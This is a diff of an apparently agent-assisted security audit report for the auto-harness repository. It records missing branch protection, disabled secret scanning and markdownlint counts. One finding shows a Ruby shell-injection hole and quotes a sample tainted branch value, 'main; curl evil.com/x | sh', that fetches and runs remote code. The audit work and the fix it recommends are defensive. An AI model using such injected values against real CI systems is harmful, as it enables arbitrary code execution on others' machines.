@@ -257,6 +257,7 @@ Lane sources are noted where a finding was surfaced by multiple agents.
 
 **Where:** `gh api repos/unclenate/auto-harness` + `gh api .../branches/main/protection`.
 **Evidence (orchestrator-verified):**
+
 - **Branch protection on `main`: 404 (not configured).** Every `--admin` merge today bypassed nothing because there was nothing to bypass.
 - `secret_scanning: disabled`, `secret_scanning_push_protection: disabled`, `secret_scanning_non_provider_patterns: disabled`, `secret_scanning_validity_checks: disabled`. All four are **free for public repos**.
 - `delete_branch_on_merge: false`. The session has been manually cleaning up worktree branches; auto-delete would handle this.
@@ -267,8 +268,8 @@ Lane sources are noted where a finding was surfaced by multiple agents.
 #### Finding L3-03: `base_branch` argument flows unescaped into shell interpolation — Severity: medium
 
 **Where:** `platform/validators/lib/harness_registry.rb:108-109`.
-**Evidence:** `output = \`git diff --name-only origin/#{base_branch}...HEAD 2>/dev/null\`` — `base_branch` is `ARGV[3]` of `validate-companions.sh`. A consumer invoking the validator from CI with a parameterized base branch (`bash validate-companions.sh "$manifest" "$root" "$INPUT_BASE_BRANCH"`) and a tainted `INPUT_BASE_BRANCH` like `main; curl evil.com/x | sh` would execute arbitrary shell. Most consumers hardcode `main`; the risk surfaces in CI configurations reading the base branch from PR metadata.
-**Recommendation:** Use `Open3.capture2("git", "diff", "--name-only", "origin/#{base_branch}...HEAD")` with arg-list (no shell). At minimum validate `base_branch =~ /\A[A-Za-z0-9._\/-]+\z/`.
+**Evidence:** `output = \`git diff --name-only origin/#{base_branch}...HEAD 2>/dev/null\`` — `base_branch` is `ARGV[3]` of `validate-companions.sh`. A consumer invoking the validator from CI with a parameterized base branch (`bash validate-companions.sh "$manifest" "$root" "$INPUT_BASE_BRANCH"`) and a tainted`INPUT_BASE_BRANCH` like `main; curl evil.com/x | sh` would execute arbitrary shell. Most consumers hardcode `main`; the risk surfaces in CI configurations reading the base branch from PR metadata.
+**Recommendation:** Use`Open3.capture2("git", "diff", "--name-only", "origin/#{base_branch}...HEAD")` with arg-list (no shell). At minimum validate `base_branch =~ /\A[A-Za-z0-9._\/-]+\z/`.
 
 #### Finding L3-07: `--skills` argument comma-split without per-token sanitization — Severity: low
 
@@ -362,6 +363,7 @@ Lane sources are noted where a finding was surfaced by multiple agents.
 
 **Where:** orchestrator-verified `markdownlint-cli2 v0.22.1` (markdownlint v0.40.0) against `README.md`, `HARNESS.md`, `AGENTS.md`, `CLAUDE.md`, `SUMMARY.md`, `TOOLS.md`, `platform/workflow/*.md`, `platform/README.md`.
 **Evidence:** **MD060 is a real rule** in markdownlint v0.40.0 — it is `MD060/table-column-style` (alias `table-column-style`), about consistent pipe-spacing in tables. The Lane 5 agent's report that "MD060 doesn't exist" was incorrect (their sandbox blocked WebFetch and they assumed the docs URL was 404; the URL returns 200 and the file exists). Real hit counts:
+
 - **MD013 (line-length): 736** — likely noise, consider disabling or raising limit
 - **MD060 (table-column-style): 68** — user's flagged rule
 - **MD040 (no-language-in-fence): 7**
